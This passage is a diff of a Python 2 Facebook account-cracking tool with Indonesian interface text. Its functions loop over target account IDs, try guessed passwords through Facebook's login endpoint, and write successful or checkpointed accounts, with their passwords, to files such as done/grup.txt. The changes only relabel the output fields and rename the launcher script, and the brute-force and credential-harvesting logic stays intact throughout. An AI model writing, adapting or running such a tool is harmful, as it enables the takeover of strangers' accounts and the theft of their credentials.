                                 elif 'www.facebook.com' in ko['error_msg']:
                                     print '\n\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} \x1b[1;91mCEKPOINT'
-                                    print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;91m' + j['name']
-                                    print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;91m' + zowe
-                                    print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;91m' + bos6
+                                    print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    : \x1b[1;91m' + j['name']
+                                    print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} ID  \x1b[1;91m    : \x1b[1;91m' + zowe
+                                    print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Pw Fb  \x1b[1;91m: \x1b[1;91m' + bos6
                                     cek = open('done/pakis.txt', 'a')
-                                    cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos6 + '\n')
+                                    cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     : ' + j['name'] + '\n{\xc3\x97} ID     : ' + zowe + '\n{\xc3\x97} Pw Fb : ' + bos6 + '\n')
                                     cek.close()
                                     cekpoint.append(zowe)
                                 else:
@@ -1358,20 +1358,20 @@ def pilih_pakis():
                                     ko = json.load(data)
                                     if 'access_token' in ko:
                                         print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mBERHASIL'
-                                        print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m' + j['name']
-                                        print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
-                                        print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos7
+                                        print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    : \x1b[1;92m' + j['name']
+                                        print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} ID  \x1b[1;91m    : \x1b[1;92m' + zowe
+                                        print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Pw Fb  \x1b[1;91m: \x1b[1;92m' + bos7
                                         oke = open('done/pakis.txt', 'a')
-                                        oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos7 + '\n')
+                                        oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     : ' + j['name'] + '\n{\xc3\x97} ID     : ' + zowe + '\n{\xc3\x97} Pw Fb : ' + bos7 + '\n')
                                         oke.close()
                                         oks.append(zowe)
                                     elif 'www.facebook.com' in ko['error_msg']:
                                         print '\n\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} \x1b[1;91mCEKPOINT'
-                                        print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;91m' + j['name']
-                                        print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;91m' + zowe
-                                        print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;91m' + bos7
+                                        print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    : \x1b[1;91m' + j['name']
+                                        print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} ID  \x1b[1;91m    : \x1b[1;91m' + zowe
+                                        print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Pw Fb  \x1b[1;91m: \x1b[1;91m' + bos7
                                         cek = open('done/pakis.txt', 'a')
-                                        cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos7 + '\n')
+                                        cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     : ' + j['name'] + '\n{\xc3\x97} ID     : ' + zowe + '\n{\xc3\x97} Pw Fb : ' + bos7 + '\n')
                                         cek.close()
                                         cekpoint.append(zowe)
                                     else:
@@ -1380,20 +1380,20 @@ def pilih_pakis():
                                         ko = json.load(data)
                                         if 'access_token' in ko:
                                             print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mBERHASIL'
-                                            print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m' + j['name']
-                                            print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
-                                            print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos8
+                                            print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    : \x1b[1;92m' + j['name']
+                                            print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} ID  \x1b[1;91m    : \x1b[1;92m' + zowe
+                                            print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Pw Fb  \x1b[1;91m: \x1b[1;92m' + bos8
                                             oke = open('done/pakis.txt', 'a')
-                                            oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos8 + '\n')
+                                            oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     : ' + j['name'] + '\n{\xc3\x97} ID     : ' + zowe + '\n{\xc3\x97} Pw Fb : ' + bos8 + '\n')
                                             oke.close()
                                             oks.append(zowe)
                                         elif 'www.facebook.com' in ko['error_msg']:
                                             print '\n\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} \x1b[1;93mCEKPOINT'
-                                            print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;91m' + j['name']
-                                            print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;91m' + zowe
-                                            print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;91m' + bos8
+                                            print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    : \x1b[1;91m' + j['name']
+                                            print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} ID  \x1b[1;91m    : \x1b[1;91m' + zowe
+                                            print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Pw Fb  \x1b[1;91m: \x1b[1;91m' + bos8
                                             cek = open('done/pakis.txt', 'a')
-                                            cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos8 + '\n')
+                                            cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     : ' + j['name'] + '\n{\xc3\x97} ID     : ' + zowe + '\n{\xc3\x97} Pw Fb : ' + bos8 + '\n')
                                             cek.close()
                                             cekpoint.append(zowe)
         except:
@@ -1407,7 +1407,7 @@ def pilih_pakis():
     print '\x1b[1;97m{\x1b[1;91m\xe2\x97\x8f\x1b[1;97m} \x1b[1;92mOK\x1b[1;97m/\x1b[1;91mCP \x1b[1;91mfile tersimpan \x1b[1;91m: \x1b[1;92mdone/pakis.txt'
     print 50 * '\x1b[1;94m\xe2\x94\x80'
     raw_input('\x1b[1;97m{<\x1b[1;91mKembali\x1b[1;97m>}')
-    os.system('python2 cr4ck.py')
+    os.system('python2 roy-scold.py')
 
 
 def crack_likes():
@@ -1466,20 +1466,20 @@ def crack_likes():
             ko = json.load(data)
             if 'access_token' in ko:
                 print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mBERHASIL'
-                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m' + j['name']
-                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
-                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos1
+                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    : \x1b[1;92m' + j['name']
+                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} ID  \x1b[1;91m    : \x1b[1;92m' + zowe
+                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Pw Fb  \x1b[1;91m: \x1b[1;92m' + bos1
                 oke = open('done/grup.txt', 'a')
-                oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos1 + '\n')
+                oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     : ' + j['name'] + '\n{\xc3\x97} ID     : ' + zowe + '\n{\xc3\x97} Pw Fb : ' + bos1 + '\n')
                 oke.close()
                 oks.append(zowe)
             elif 'www.facebook.com' in ko['error_msg']:
                 print '\n\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} \x1b[1;96mCEKPOINT'
-                print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;96m' + j['name']
-                print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;96m' + zowe
-                print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;96m' + bos1
+                print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    : \x1b[1;96m' + j['name']
+                print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} ID  \x1b[1;91m    : \x1b[1;96m' + zowe
+                print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} Pw Fb  \x1b[1;91m: \x1b[1;96m' + bos1
                 cek = open('done/grup.txt', 'a')
-                cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos1 + '\n')
+                cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     : ' + j['name'] + '\n{\xc3\x97} ID     : ' + zowe + '\n{\xc3\x97} Pw Fb : ' + bos1 + '\n')
                 cek.close()
                 cekpoint.append(zowe)
             else:
@@ -1488,20 +1488,20 @@ def crack_likes():
                 ko = json.load(data)
                 if 'access_token' in ko:
                     print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mBERHASIL'
-                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m' + j['name']
-                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
-                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos2
+                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    : \x1b[1;92m' + j['name']
+                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} ID  \x1b[1;91m    : \x1b[1;92m' + zowe
+                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Pw Fb  \x1b[1;91m: \x1b[1;92m' + bos2
                     oke = open('done/grup.txt', 'a')
-                    oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos2 + '\n')
+                    oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     : ' + j['name'] + '\n{\xc3\x97} ID     : ' + zowe + '\n{\xc3\x97} Pw Fb : ' + bos2 + '\n')
                     oke.close()
                     oks.append(zowe)
                 elif 'www.facebook.com' in ko['error_msg']:
                     print '\n\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} \x1b[1;96mCEKPOINT'
-                    print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;96m' + j['name']
-                    print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;96m' + zowe
-                    print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;96m' + bos2
+                    print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    : \x1b[1;96m' + j['name']
+                    print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} ID  \x1b[1;91m    : \x1b[1;96m' + zowe
+                    print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} Pw Fb  \x1b[1;91m: \x1b[1;96m' + bos2
                     cek = open('done/grup.txt', 'a')
-                    cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos2 + '\n')
+                    cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     : ' + j['name'] + '\n{\xc3\x97} ID     : ' + zowe + '\n{\xc3\x97} Pw Fb : ' + bos2 + '\n')
                     cek.close()
                     cekpoint.append(zowe)
                 else:
@@ -1510,20 +1510,20 @@ def crack_likes():
                     ko = json.load(data)
                     if 'access_token' in ko:
                         print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mBERHASIL'
-                        print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m' + j['name']
-                        print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
-                        print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos3
+                        print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    : \x1b[1;92m' + j['name']
+                        print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} ID  \x1b[1;91m    : \x1b[1;92m' + zowe
+                        print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Pw Fb  \x1b[1;91m: \x1b[1;92m' + bos3
                         oke = open('done/grup.txt', 'a')
-                        oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos3 + '\n')
+                        oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     : ' + j['name'] + '\n{\xc3\x97} ID     : ' + zowe + '\n{\xc3\x97} Pw Fb : ' + bos3 + '\n')
                         oke.close()
                         oks.append(zowe)
                     elif 'www.facebook.com' in ko['error_msg']:
                         print '\n\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} \x1b[1;96mCEKPOINT'
-                        print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;96m' + j['name']
-                        print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;96m' + zowe
-                        print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;96m' + bos3
+                        print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    : \x1b[1;96m' + j['name']
+                        print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} ID  \x1b[1;91m    : \x1b[1;96m' + zowe
+                        print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} Pw Fb  \x1b[1;91m: \x1b[1;96m' + bos3
                         cek = open('done/grup.txt', 'a')
-                        cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos3 + '\n')
+                        cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     : ' + j['name'] + '\n{\xc3\x97} ID     : ' + zowe + '\n{\xc3\x97} Pw Fb : ' + bos3 + '\n')
                         cek.close()
                         cekpoint.append(zowe)
                     else:
@@ -1532,20 +1532,20 @@ def crack_likes():
                         ko = json.load(data)
                         if 'access_token' in ko:
                             print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mBERHASIL'
-                            print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m' + j['name']
-                            print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
-                            print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos4
+                            print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    : \x1b[1;92m' + j['name']
+                            print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} ID  \x1b[1;91m    : \x1b[1;92m' + zowe
+                            print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Pw Fb  \x1b[1;91m: \x1b[1;92m' + bos4
                             oke = open('done/grup.txt', 'a')
-                            oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos4 + '\n')
+                            oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     : ' + j['name'] + '\n{\xc3\x97} ID     : ' + zowe + '\n{\xc3\x97} Pw Fb : ' + bos4 + '\n')
                             oke.close()
                             oks.append(zowe)
                         elif 'www.facebook.com' in ko['error_msg']:
                             print '\n\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} \x1b[1;96mCEKPOINT'
-                            print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;96m' + j['name']
-                            print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;96m' + zowe
-                            print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;96m' + bos4
+                            print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    : \x1b[1;96m' + j['name']
+                            print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} ID  \x1b[1;91m    : \x1b[1;96m' + zowe
+                            print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} Pw Fb  \x1b[1;91m: \x1b[1;96m' + bos4
                             cek = open('done/grup.txt', 'a')
-                            cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos4 + '\n')
+                            cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     : ' + j['name'] + '\n{\xc3\x97} ID     : ' + zowe + '\n{\xc3\x97} Pw Fb : ' + bos4 + '\n')
                             cek.close()
                             cekpoint.append(zowe)
                         else:
@@ -1554,20 +1554,20 @@ def crack_likes():
                             ko = json.load(data)
                             if 'access_token' in ko:
                                 print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mBERHASIL'
-                                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m' + j['name']
-                                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
-                                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos5
+                                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    : \x1b[1;92m' + j['name']
+                                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} ID  \x1b[1;91m    : \x1b[1;92m' + zowe
+                                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Pw Fb  \x1b[1;91m: \x1b[1;92m' + bos5
                                 oke = open('done/grup.txt', 'a')
-                                oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos5 + '\n')
+                                oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     : ' + j['name'] + '\n{\xc3\x97} ID     : ' + zowe + '\n{\xc3\x97} Pw Fb : ' + bos5 + '\n')
                                 oke.close()
                                 oks.append(zowe)
                             elif 'www.facebook.com' in ko['error_msg']:
                                 print '\n\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} \x1b[1;96mCEKPOINT'
-                                print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;96m' + j['name']
-                                print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;96m' + zowe
-                                print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;96m' + bos5
+                                print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    : \x1b[1;96m' + j['name']
+                                print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} ID  \x1b[1;91m    : \x1b[1;96m' + zowe
+                                print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} Pw Fb  \x1b[1;91m: \x1b[1;96m' + bos5
                                 cek = open('done/grup.txt', 'a')
-                                cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos5 + '\n')
+                                cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     : ' + j['name'] + '\n{\xc3\x97} ID     : ' + zowe + '\n{\xc3\x97} Pw Fb : ' + bos5 + '\n')
                                 cek.close()
                                 cekpoint.append(zowe)
                             else:
@@ -1576,20 +1576,20 @@ def crack_likes():
                                 ko = json.load(data)
                                 if 'access_token' in ko:
                                     print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mBERHASIL'
-                                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m' + j['name']
-                                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
-                                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos6
+                                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    : \x1b[1;92m' + j['name']
+                                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} ID  \x1b[1;91m    : \x1b[1;92m' + zowe
+                                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Pw Fb  \x1b[1;91m: \x1b[1;92m' + bos6
                                     oke = open('done/grup.txt', 'a')
-                                    oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos6 + '\n')
+                                    oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     : ' + j['name'] + '\n{\xc3\x97} ID     : ' + zowe + '\n{\xc3\x97} Pw Fb : ' + bos6 + '\n')
                                     oke.close()
                                     oks.append(zowe)
                                 elif 'www.facebook.com' in ko['error_msg']:
                                     print '\n\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} \x1b[1;96mCEKPOINT'
-                                    print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;96m' + j['name']
-                                    print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;96m' + zowe
-                                    print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;96m' + bos6
+                                    print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    : \x1b[1;96m' + j['name']
+                                    print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} ID  \x1b[1;91m    : \x1b[1;96m' + zowe
+                                    print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} Pw Fb  \x1b[1;91m: \x1b[1;96m' + bos6
                                     cek = open('done/grup.txt', 'a')
-                                    cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos6 + '\n')
+                                    cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     : ' + j['name'] + '\n{\xc3\x97} ID     : ' + zowe + '\n{\xc3\x97} Pw Fb : ' + bos6 + '\n')
                                     cek.close()
                                     cekpoint.append(zowe)
         except:
@@ -1603,7 +1603,7 @@ def crack_likes():
     print '\x1b[1;97m{\x1b[1;96m\xe2\x97\x8f\x1b[1;97m} \x1b[1;92mOK\x1b[1;97m/\x1b[1;96mCP \x1b[1;96mfile tersimpan \x1b[1;91m: \x1b[1;92mdone/grup.txt'
     print 50 * '\x1b[1;94m\xe2\x94\x80'
     raw_input('\x1b[1;97m{<\x1b[1;96mKembali\x1b[1;97m>}')
-    os.system('python2 cr4ck.py')
+    os.system('python2 roy-scold.py')
 
 
 def crack_follow():
@@ -1659,20 +1659,20 @@ def crack_follow():
             ko = json.load(data)
             if 'access_token' in ko:
                 print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mBERHASIL'
-                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m' + j['name']
-                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
-                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos1
+                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    : \x1b[1;92m' + j['name']
+                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} ID  \x1b[1;91m    : \x1b[1;92m' + zowe
+                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Pw Fb  \x1b[1;91m: \x1b[1;92m' + bos1
                 oke = open('done/follow.txt', 'a')
-                oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos1 + '\n')
+                oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     : ' + j['name'] + '\n{\xc3\x97} ID     : ' + zowe + '\n{\xc3\x97} Pw Fb : ' + bos1 + '\n')
                 oke.close()
                 oks.append(zowe)
             elif 'www.facebook.com' in ko['error_msg']:
                 print '\n\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} \x1b[1;95mCEKPOINT'
-                print '\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;95m' + j['name']
-                print '\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;95m' + zowe
-                print '\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;95m' + bos1
+                print '\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    : \x1b[1;95m' + j['name']
+                print '\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} ID  \x1b[1;91m    : \x1b[1;95m' + zowe
